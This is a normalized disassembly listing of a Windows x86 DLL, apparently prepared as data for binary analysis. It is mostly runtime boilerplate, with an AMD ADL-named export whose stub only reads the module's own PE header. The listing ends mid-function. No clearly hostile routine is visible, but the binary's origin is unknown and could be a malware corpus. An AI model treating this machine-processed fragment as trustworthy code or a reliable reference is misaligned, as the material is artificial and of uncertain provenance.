lea eax [ ebp - 0x4 ]
push 0x0
mov [ ebp - 0x4 ] eax
call [ GetModuleHandleW@IAT ]
xor eax eax
mov esp ebp
pop ebp
retn
sub_100160f0
xor eax eax
retn 0x4
sub_100161e5
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_1001630e
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_10016390
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_100171db
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10017220
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x3e ]
mov edx [ ebp + 0xc ]
cmp [ edx + 0x3e ] cl
sbb eax eax
neg eax
pop ebp
retn
sub_10017460
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10017dcd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10005afb
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1001905b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10038ea0
sub_100196d8
mov esi [ ebp + 0x8 ]
call sub_1002e400
push 0x0
push 0x0
call sub_1002050e
int3
sub_10019b04
mov [ ecx ] r--data
jmp sub_100254fa
sub_10019c00
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
jmp sub_1001a1b3
sub_1001a1b0
xor eax eax
retn
sub_1001a1b3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001a349
push 0xd
call sub_1003e989
pop ecx
retn
sub_1001a47f
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_1001a770
mov eax [ ecx + 0x10 ]
push edi
push r--data
xor edi edi
call sub_1005e510
neg eax
sbb eax eax
neg eax
pop edi
retn
sub_1001a9de
mov ecx [ ebp - 0x14 ]
call sub_100324d8
push 0x0
push 0x0
call sub_1002050e
int3
sub_1001adb2
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1002903f
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1001b6df
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1001b7de
push ebx
call sub_1001f63f
pop ecx
retn
sub_1001b964
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_10058fec
pop ecx
retn
sub_1001bb70
push ebp
mov ebp esp
pop ebp
jmp sub_10065045
sub_1001bc97
call sub_10044fed
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1002635d
sub_1001be09
push 0x0
call sub_10039853
pop ecx
retn
sub_1001be8b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1001bf74
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_1001bfc0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
jmp eax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
retn
sub_1001c548
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005b4d5
push [ esi + 0x10 ]
call sub_1005b4d5
push [ esi + 0x14 ]
call sub_1005b4d5
add esp 0xc
pop esi
retn
sub_1001c596
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000e35e
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1001c610
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
push 0x0
mov [ eax ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001c62e
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a800
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1001c64a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001d2c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x100
push edx
call sub_10005c7c
add esp 0x10
pop ebp
retn
sub_1001d4dc
mov eax rw-data
retn
sub_1001de8d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1002e4f2
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1001e1b5
mov [ ecx ] r--data
retn
sub_1001e215
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1001e246
xor eax eax
inc eax
retn
sub_1001e25a
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_1001be09
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_1001e497
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a041
add esp 0x10
pop ebp
retn 0xc
sub_1001f37e
push 0x1
call sub_1007c817
pop ecx
retn
sub_1001f860
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn 0x10
sub_1001f959
call sub_10044fed
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002635d
sub_1001f981
mov ecx [ ecx + 0x4 ]
call sub_10049900
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001f9a0
push ebp
mov ebp esp
push ecx
mov ecx [ rw-data ]
add ecx 0x1c
push esi
mov [ ebp - 0x4 ] 0x0
call sub_10019620
mov eax esi
mov esp ebp
pop ebp
retn
sub_10020962
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10021180
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100077e0
pop ebx
pop ebp
retn
sub_100216b0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_100218d1
mov eax 0x1
retn
sub_10022f83
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002dea9
add esp 0x14
pop ebp
retn
sub_1002378b
push 0xd
call sub_1003e989
pop ecx
retn
sub_10023797
push 0xc
call sub_1003e989
pop ecx
retn
sub_100238e9
call sub_10044fed
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002635d
sub_10023b7c
push 0xa
call sub_1003e989
pop ecx
retn
sub_10023c3a
push 0xb
call sub_1003e989
pop ecx
retn
sub_10024220
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1002423f
push 0x8
push r--data
call sub_10078b50
call sub_10044fed
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1000967a
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1002425f
xor eax eax
inc eax
retn
sub_10024730
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
pop ebp
jmp sub_10004940
sub_1002503f
xor eax eax
retn
sub_100254fa
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_10020a90
pop ecx
sub_1002595c
retn 0x4
sub_10026036
push ebx
call sub_1001f63f
pop ecx
retn
sub_100261ca
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100617ac
sub_100263ca
push 0xc
call sub_1003e989
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10027780
mov eax 0x1
retn
sub_1002783d
call sub_1001f37e
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10020a90
pop ecx
retn
call sub_100034f5
sub_10027ed0
xor eax eax
retn 0x8
sub_100286f2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100287b5
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1002050e
int3
call sub_10008f00
sub_10028897
mov eax 0x1
retn
sub_1002894b
mov al [ ecx + 0xc ]
retn
sub_10028b21
push 0x0
push 0x1
call sub_1004dbe5
retn
sub_10028cf2
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10020783
add esp 0xc
pop ebp
retn
sub_10028d70
push ebp
mov ebp esp
pop ebp
jmp sub_10056814
sub_10028dc2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_100290b0
mov eax 0x80004001
retn 0xc
sub_1002a494
mov ecx [ ebp - 0x14 ]
call sub_1005bf6b
xor ebx ebx
push ebx
push ebx
call sub_1002050e
int3
sub_1002a674
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1002d0f0
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1002d0ff
mov eax rw-data
retn
ADL_Overdrive5_PowerControlAbsValue_Set
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx [ eax + 0x3c ]
movzx eax [ ecx + eax + 0x3 ]
lea eax [ eax + eax + 0x2 ]
retn
sub_1002e063
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_1002e213
xor eax eax
retn 0x10
sub_1002e610
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002e6dc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10025881
pop ecx
pop ecx
pop ebp
retn
sub_1002e9ca
xor eax eax
retn 0x14
sub_1002efc0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
retn
mov eax [ esi + 0x4 ]
push eax
call sub_10065045
add esp 0x4
sub_1002f000
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
sub_1002f201
xor eax eax
inc eax
retn
sub_1002f205
mov esp [ ebp - 0x18 ]
call sub_1002423f
sub_1002f215
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1002f971
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10020a90
pop ecx
sub_10030030
mov eax 0x80004001
retn 0x8
sub_10030040
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x18 ]
call sub_10013180
pop ebp
retn
sub_10030adf
call sub_10044fed
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_10030b24
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10031ffa
call [ TlsAlloc@IAT ]
retn 0x4
sub_100357e8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_10035cd0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100551f3
pop ecx
pop ecx
pop ebp
retn
sub_10036266
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100794cb
add esp 0x10
pop ebp
retn
sub_10036710
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_1002f85f
add esp 0x8
pop ebp
retn 0x4
sub_10036790
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x10
sub_100368f0
push esi
jmp [ edx * 4 + r-xdata ]
sub_10037d10
mov eax [ rw-data ]
xor ecx ecx
mov [ eax + 0x104 ] ecx
mov [ eax + 0x10c ] ecx
mov [ eax + 0x108 ] 0x1
retn
sub_100382f1
call sub_10044fed
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002635d
sub_100383ad
push 0xa
call sub_1003e989
pop ecx
retn
sub_10039340
mov eax 0x80004002
retn 0xc
sub_10039bc4
or eax 0xffffffff
retn 0x8
sub_10039fba
mov ecx [ ebp - 0x1c ]
call sub_1001c548
xor ebx ebx
push ebx
push ebx
call sub_1002050e
int3
sub_1003a0d0
push 0xa
call sub_1003e989
pop ecx
retn
sub_1003a3d0
xor al al
retn
sub_1003b4e0
mov ecx [ eax + 0x4 ]
push ecx
call sub_10065045
pop ecx
retn
sub_1003b511
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1003cda0
push ebp
mov ebp esp
pop ebp
jmp sub_1005ac7e
sub_1003d430
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_1003d900
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_1003d9e2
call sub_10008b48
retn
sub_1003e989
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1003fa9e
mov edi edi
push ebp
mov ebp esp
call sub_1006a460
push [ ebp + 0x8 ]
call sub_1005e59c
pop ecx
push 0xff
call sub_1005d371
int3
sub_1003fdf0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10041050
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x18 ]
call sub_10065880
pop edi
pop ebp
retn
sub_10041f90
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_10026059
pop ecx
pop ecx
pop ebp
retn 0x4
sub_100420c4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_1004243b
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_1004262a
mov eax rw-data
retn
sub_10042680
retn 0x4
sub_100426da
push sub_1002423f
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1004403c
mov ax [ ecx + 0xe ]
retn
sub_10044c11
mov edi edi
push esi
call sub_100539e5
mov esi [ eax + 0x4 ]
call sub_1001f959
mov edx eax
mov eax esi
pop esi
retn
sub_100456a0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_100456b0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_10065045
add esp 0x4
sub_10047330
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
jmp edx
xor eax eax
retn
sub_100476f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_10020a90
add esp 0x4
sub_100483a0
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10049490
xor eax eax
xor edx edx
retn
sub_1004a1e9
mov eax rw-data
retn
sub_1004a2ab
push ebx
call sub_1001f63f
pop ecx
retn
sub_1004c0c0
mov eax ecx
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_1004c3b0
mov eax 0x5
retn
sub_1004c551
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1004c7aa
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10017260
pop ecx
pop ecx
pop ebp
retn
sub_1004c970
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_1004c990
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
call sub_1001aaa0
pop edi
pop ebx
pop ebp
retn
sub_1004dba0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x0
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_1004eb20
mov eax ecx
retn 0xc
sub_100509dd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100592bc
add esp 0xc
pop ebp
retn
sub_10050bdc
push esi
call sub_1005de35
pop ecx
retn
sub_10050dd1
mov eax [ ecx + 0x1c ]
retn
sub_10050dd5
push 0x8
call sub_1003938d
pop ecx
retn
sub_10051f29
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_100528bd
push [ ecx ]
call sub_1001bf74
pop ecx
retn
sub_10052b07
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100539e5
call sub_10044fed
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002635d
j_sub_10030adf
jmp sub_10030adf
sub_100543a1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10039bca
add esp 0x10
pop ebp
retn
sub_10054813
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1002050e
int3
call sub_10067150
sub_10055970
mov [ ecx ] r--data
retn
sub_10055a43
push ebx
call sub_1001f63f
pop ecx
retn
sub_10055f90
push ecx
call [ VariantClear@IAT ]
retn
sub_10057822
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1005787d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10039520
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10058428
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10025903
add esp 0x10
pop ebp
retn
sub_10058553
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10058812
mov ecx [ ebp - 0x18 ]
call sub_1001c548
xor ebx ebx
push ebx
push ebx
call sub_1002050e
int3
sub_10059053
push 0xe
call sub_1003e989
pop ecx
retn
sub_100591b9
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1004dbe5
push esi
push esi
call sub_1002050e
int3
sub_1005ae29
mov edi edi
push ebp
mov ebp esp
call sub_1000c920
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_10049ed6
sub_1005b2d3
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a800
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1005b430
or eax 0xffffffff
retn
sub_1005b9b6
mov eax [ rw-data ]
retn
sub_1005bd12
mov [ ecx ] r--data
jmp sub_10019b04
sub_1005bd1d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a800
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1005bf6b
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005b4d5
push [ esi + 0xc ]
call sub_1005b4d5
pop ecx
pop ecx
pop esi
retn
sub_1005cff6
push 0x5
pop eax
retn
sub_1005d371
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_100781cd
add esp 0xc
pop ebp
retn
sub_1005d8b6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_100238e9
sub_1005dae0
mov eax 0x80004001
retn 0x14
sub_1005dcf5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1005dd12
push 0x2
call sub_1003fa9e
sub_1005e29b
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1001a1e8
pop ecx
mov [ rw-data ] 0x1
sub_1005e35b
mov eax r-xdata
retn
sub_1005e3b3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10020833
sub_1005e4b0
push esi
mov esi ecx
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x90 ] 0x0
sub_1005e4d0
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1005e81c
mov edx [ ebp - 0x14 ]
push edx
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_1005f0c6
mov eax 0x1
retn
sub_1005f600
add ecx 0x4
jmp sub_100528bd
sub_1005f9b1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10011eb4
pop ecx
pop ecx
pop ebp
retn
sub_1005f9c4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1005fabb
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1002050e
int3
mov ecx esi
call sub_10027980
push esi
call sub_10065045
add esp 0x4
sub_1005fd00
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
retn
sub_1005fefb
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_1005e59c
push 0x1
push 0x0
call sub_1001a1c7
add esp 0xc
jmp sub_1000967a
call eax
sub_10060000
add ecx 0x4
jmp sub_10064571
sub_10060331
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006107f
mov ecx [ ebp - 0x14 ]
call sub_1005bf6b
xor ebx ebx
push ebx
push ebx
call sub_1002050e
int3
sub_10061091
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_100420c4
push [ esi ]
call sub_10065045
pop ecx
pop ecx
pop esi
retn
sub_100611ee
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_100616c0
mov eax 0x6
retn
sub_1006181f
push 0x0
call sub_10004425
pop ecx
retn
sub_10062090
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0xa
push edx
call sub_10005c7c
add esp 0x10
pop ebp
retn
sub_100620b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
pop ebp
retn
sub_1006235d
mov eax [ ecx + 0x4 ]
retn
sub_10062361
xor eax eax
retn 0x8
sub_1006312b
mov edi edi
push esi
call sub_100539e5
mov esi [ eax + 0x8 ]
call sub_100382f1
mov edx eax
mov eax esi
pop esi
retn
sub_1006336b
mov edi edi
push ebp
mov ebp esp
call sub_100435f4
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_1004df54
pop ecx
sub_100633c0
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100408f0
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_100633dc
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10020a90
pop ecx
sub_10064571
push [ ecx ]
call sub_1000c910
pop ecx
retn
sub_10064c80
push ecx
mov [ ecx ] r--data
call sub_1005927e
pop ecx
retn
sub_10065673
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_1002050e
int3
push eax
call sub_10065045
add esp 0x4
sub_10065970
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_10066f6e
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1002e4f2
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10067084
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1000e9b8
sub_10067150
push esi
push 0x0
mov [ esi ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_100671b0
xor al al
retn
sub_1006744a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
